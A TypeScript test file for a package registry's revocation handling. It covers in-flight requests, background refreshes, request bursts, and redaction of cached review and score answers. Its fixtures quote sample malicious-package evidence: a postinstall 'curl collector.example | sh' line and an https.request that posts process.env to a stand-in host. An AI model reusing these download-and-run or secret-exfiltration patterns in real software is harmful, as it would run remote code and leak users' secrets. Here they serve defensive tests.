// Revocation against requests that overlap: a GET still in flight when the registry starts refusing a version, a
// background refresh, a burst of views, and the cached review and score answers that quote a version's source. The
// registry is a fetch stub whose answers this file controls, down to holding one request until the test releases it.
import { afterAll, afterEach, beforeAll, describe, expect, mock, setSystemTime, spyOn, test } from "bun:test";
import { z } from "zod";
import { POLICIES } from "./edge-cache";
import { fileStatus } from "./package-status";
import { askServable, fetchJson, type Fetched } from "./registry-fetch";
import { fileApiPath, REGISTRY, servableKey } from "./registry-url";

// lib/registry.ts is the server entry point; outside Next its marker import would throw
void mock.module("server-only", () => ({}));

const { getReview, getVersionScore } = await import("./registry");

const T0 = Date.parse("2026-11-12T12:00:00Z");
const FileDoc = z.object({ kind: z.literal("text"), text: z.string() });

type Answer = { status: number; body?: unknown };

type Held = { method: string; path: string; release: (a: Answer) => void };

/** The registry's answer per path (both methods); 200 with a small file when unset. */
const answers = new Map<string, Answer>();

/** "METHOD path" of the next request to hold until the test releases it. */
const toHold = new Set<string>();

const held: Held[] = [];
const seen: { method: string; path: string; at: number }[] = [];
const realFetch = globalThis.fetch;

function respond(a: Answer, method: string): Response {
  return new Response(method === "HEAD" ? null : JSON.stringify(a.body ?? { error: `answered ${a.status}` }), { status: a.status, headers: { "content-type": "application/json" } });
}

beforeAll(() => {
  const stub = (input: Parameters<typeof fetch>[0], init?: Parameters<typeof fetch>[1]): Promise<Response> => {
    const url = input instanceof Request ? input.url : input.toString();

    if (!url.startsWith(REGISTRY)) return realFetch(input, init);
    const path = `/${url.slice(REGISTRY.length)}`;
    const method = init?.method ?? "GET";
    seen.push({ method, path, at: Date.now() });

    if (toHold.delete(`${method} ${path}`)) return new Promise((resolve) => held.push({ method, path, release: (a) => resolve(respond(a, method)) }));

    return Promise.resolve(respond(answers.get(path) ?? { status: 200, body: { kind: "text", text: "hello" } }, method));
  };

  spyOn(globalThis, "fetch").mockImplementation(Object.assign(stub, { preconnect: realFetch.preconnect }));
});

afterEach(() => {
  setSystemTime();
});

afterAll(() => {
  mock.restore();
});

/** The request held for `method` and `path`, once the code under test has sent it. */
async function heldRequest(method: string, path: string): Promise<Held> {
  for (let i = 0; i < 200; i++) {
    const at = held.findIndex((h) => h.method === method && h.path === path);

    if (at >= 0) return held.splice(at, 1)[0] ?? Promise.reject(new Error("unreachable"));
    await Bun.sleep(1);
  }

  throw new Error(`no ${method} ${path} was sent`);
}

function fileOf(name: string) {
  const target = { name, version: "1.0.0", path: "index.js" };
  const path = `/${fileApiPath(target)}`;

  return {
    target,
    path,
    view: (): Promise<Fetched<z.infer<typeof FileDoc>>> => fetchJson({ url: `${REGISTRY}${fileApiPath(target)}`, schema: FileDoc, cache: POLICIES.versionFile, servable: servableKey(target) }),
    answer: (status: number) => answers.set(path, { status, body: status === 200 ? { kind: "text", text: "hello" } : undefined }),
    hold: (method: string) => toHold.add(`${method} ${path}`),
    asked: (method: string, since: number) => seen.filter((s) => s.method === method && s.path === path && s.at >= since).length,
  };
}

const GONE = { kind: "unavailable", reason: { kind: "status", status: 410 } } as const;

describe("a slow request and a revoke", () => {
  test("a GET sent before the revoke and answered after a 410 does not make the file servable again", async () => {
    const f = fileOf("race-held-get");
    setSystemTime(T0);
    f.hold("GET");
    const old = f.view();
    const get = await heldRequest("GET", f.path);

    // the revoke: a HEAD a second later is refused
    setSystemTime(T0 + 1_000);
    f.answer(410);
    expect(await fileStatus(f.target)).toBe("refused");

    // the old GET comes back with the bytes; its own caller asked before the revoke and gets them
    setSystemTime(T0 + 3_000);
    get.release({ status: 200, body: { kind: "text", text: "before the revoke" } });
    expect((await old).kind).toBe("ok");

    // within five seconds of the old GET, still: the next view asks the registry and is refused
    setSystemTime(T0 + 4_000);
    expect(await f.view()).toEqual(GONE);
    expect(f.asked("GET", T0 + 4_000) + f.asked("HEAD", T0 + 4_000)).toBe(1);
    // and ten seconds after the revoke
    setSystemTime(T0 + 11_000);
    expect(await f.view()).toEqual(GONE);
  });

  test("a yes counts from when its request started: a GET that took 6 seconds is checked again at once", async () => {
    const f = fileOf("race-slow-get");
    setSystemTime(T0);
    f.hold("GET");
    const first = f.view();
    const get = await heldRequest("GET", f.path);
    setSystemTime(T0 + 6_000);
    get.release({ status: 200, body: { kind: "text", text: "hello" } });
    expect((await first).kind).toBe("ok");

    setSystemTime(T0 + 6_500);
    expect((await f.view()).kind).toBe("ok");
    expect(f.asked("HEAD", T0 + 6_500)).toBe(1);
  });

  test("a background refresh sent before the revoke does not undo it", async () => {
    const f = fileOf("race-background");
    setSystemTime(T0);
    expect((await f.view()).kind).toBe("ok");

    // the bytes are stale: the view checks the version with a HEAD, serves them, and refreshes them in the background
    const tb = T0 + POLICIES.versionFile.freshMs + 1_000;
    setSystemTime(tb);
    f.hold("GET");
    expect((await f.view()).kind).toBe("ok");
    const refresh = await heldRequest("GET", f.path);

    setSystemTime(tb + 6_000);
    f.answer(410);
    expect(await fileStatus(f.target)).toBe("refused");
    setSystemTime(tb + 7_000);
    refresh.release({ status: 200, body: { kind: "text", text: "hello" } });
    await Bun.sleep(5);

    setSystemTime(tb + 8_000);
    expect(await f.view()).toEqual(GONE);
  });

  test("the permission to serve and the no it records outlive every request that could still answer", () => {
    expect(POLICIES.servableRecord.freshMs).toBeGreaterThan(20_000);
    expect(POLICIES.servableRecord.freshMs).toBeGreaterThan(POLICIES.servable.freshMs);
  });
});

describe("a burst of views", () => {
  test("views of one file that miss the permission at once send one HEAD", async () => {
    const f = fileOf("burst");
    setSystemTime(T0);
    await f.view();

    setSystemTime(T0 + POLICIES.servable.freshMs + 1_000);
    const since = Date.now();
    f.hold("HEAD");
    const views = [f.view(), f.view(), f.view()];
    const status = fileStatus(f.target);
    const head = await heldRequest("HEAD", f.path);
    await Bun.sleep(5);
    expect(f.asked("HEAD", since)).toBe(1);
    head.release({ status: 200 });

    expect((await Promise.all(views)).map((v) => v.kind)).toEqual(["ok", "ok", "ok"]);
    expect(await status).toBe("ok");
  });

  test("a caller that gives up does not wait on a HEAD it shares", async () => {
    const f = fileOf("burst-abort");
    const servable = servableKey(f.target);
    setSystemTime(T0);
    f.hold("HEAD");
    const first = askServable({ url: `${REGISTRY}${fileApiPath(f.target)}`, servable });
    const head = await heldRequest("HEAD", f.path);
    const abort = new AbortController();
    const second = askServable({ url: `${REGISTRY}${fileApiPath(f.target)}`, servable, signal: abort.signal });
    abort.abort();
    expect((await second).kind).toBe("unavailable");
    head.release({ status: 200 });
    expect((await first).kind).toBe("ok");
  });
});

// ---------- answers that quote a version's source ----------
const reviewPath = (name: string) => `/-/apm/v1/review/${name}/1.0.0`;
const scorePath = (name: string) => `/-/apm/v1/score/${name}/1.0.0`;

function reviewBody(name: string, redacted: boolean) {
  const finding = { file: "index.js", line: 2, quote: redacted ? "" : "collector.example", excerpt: redacted ? "" : "https.request({ host: 'collector.example' })", issue: "Posts process.env to a remote host.", severity: "high" };

  return {
    name,
    version: "1.0.0",
    status: "reviewed",
    redacted,
    review: { state: "confirmed", model: "m", reviewedAt: "2026-11-12T00:00:00Z", coverage: { mode: "files", previousVersion: null, filesInScope: 1, filesRead: 1 }, read: ["index.js"], notRead: [], findings: [finding], decidedAt: null, note: null },
    viewer: "public",
    private: null,
    canRequest: false,
  };
}

function scoreBody(name: string, redacted: boolean) {
  const evidence = redacted ? ["index.js:2", "package.json scripts.postinstall"] : ["index.js:2: https.request({ host: 'collector.example' })", "package.json scripts.postinstall: curl collector.example | sh"];

  return {
    name,
    version: "1.0.0",
    score: 30,
    grade: "F",
    redacted,
    signals: [{ id: "network", label: "Network access", points: -20, evidence, confidence: "confirmed" }],
    dismissed: [],
  };
}

describe("cached review and score answers of a version that gets revoked", () => {
  test("a cached review is read again once the version's permission is a few seconds old, and the redacted answer is shown", async () => {
    const name = "gate-review";
    answers.set(reviewPath(name), { status: 200, body: reviewBody(name, false) });
    setSystemTime(T0);
    const first = await getReview(name, "1.0.0");
    expect(first.kind === "ok" && first.value.review?.findings[0]?.excerpt).toContain("collector.example");

    // revoked: the registry now sends the review without excerpts; the cached copy is still within its stale window
    answers.set(reviewPath(name), { status: 200, body: reviewBody(name, true) });
    setSystemTime(T0 + POLICIES.servable.freshMs + 1_000);
    const after = await getReview(name, "1.0.0");
    expect(after.kind).toBe("ok");
    expect(JSON.stringify(after)).not.toContain("collector.example");
    expect(after.kind === "ok" && after.value.review?.findings[0]?.line).toBe(2);
  });

  test("a revoke heard through a file's 410 hides a cached score at once, before its own cache runs out", async () => {
    const name = "gate-score";
    const file = fileOf(name);
    answers.set(scorePath(name), { status: 200, body: scoreBody(name, false) });
    setSystemTime(T0);
    expect(JSON.stringify(await getVersionScore(name, "1.0.0"))).toContain("collector.example");

    setSystemTime(T0 + 1_000);
    file.answer(410);
    answers.set(scorePath(name), { status: 200, body: scoreBody(name, true) });
    expect(await fileStatus(file.target)).toBe("refused");

    // the score's own cache is fresh for a minute
    setSystemTime(T0 + 2_000);
    const after = await getVersionScore(name, "1.0.0");
    expect(after.kind).toBe("ok");
    expect(JSON.stringify(after)).not.toContain("collector.example");
    expect(after.kind === "ok" && after.value.signals[0]?.evidence).toEqual(["index.js:2", "package.json scripts.postinstall"]);
  });

  test("a redacted answer is a no for the version's files as well", async () => {
    const name = "gate-review-then-file";
    const file = fileOf(name);
    setSystemTime(T0);
    expect((await file.view()).kind).toBe("ok");

    setSystemTime(T0 + 1_000);
    answers.set(reviewPath(name), { status: 200, body: reviewBody(name, true) });
    file.answer(410);
    expect((await getReview(name, "1.0.0")).kind).toBe("ok");

    // the file's yes is a second old, but the review said the version is revoked since
    setSystemTime(T0 + 2_000);
    expect(await file.view()).toEqual(GONE);
  });

  test("when the registry can't be asked, a cached review is shown without its excerpts", async () => {
    const name = "gate-review-outage";
    answers.set(reviewPath(name), { status: 200, body: reviewBody(name, false) });
    setSystemTime(T0);
    await getReview(name, "1.0.0");

    answers.set(reviewPath(name), { status: 503 });
    setSystemTime(T0 + POLICIES.servable.freshMs + 1_000);
    const down = await getReview(name, "1.0.0");
    expect(down.kind).toBe("ok");
    expect(JSON.stringify(down)).not.toContain("collector.example");
    expect(down.kind === "ok" && down.value.review?.findings[0]?.issue).toBe("Posts process.env to a remote host.");
  });

  test("an answer that quotes no source is served from the cache as before", async () => {
    const name = "gate-score-clean";
    answers.set(scorePath(name), { status: 200, body: { ...scoreBody(name, false), signals: [] } });
    setSystemTime(T0);
    await getVersionScore(name, "1.0.0");
    setSystemTime(T0 + POLICIES.servable.freshMs + 1_000);
    expect((await getVersionScore(name, "1.0.0")).kind).toBe("ok");
    expect(seen.filter((s) => s.path === scorePath(name)).length).toBe(1);
  });
});
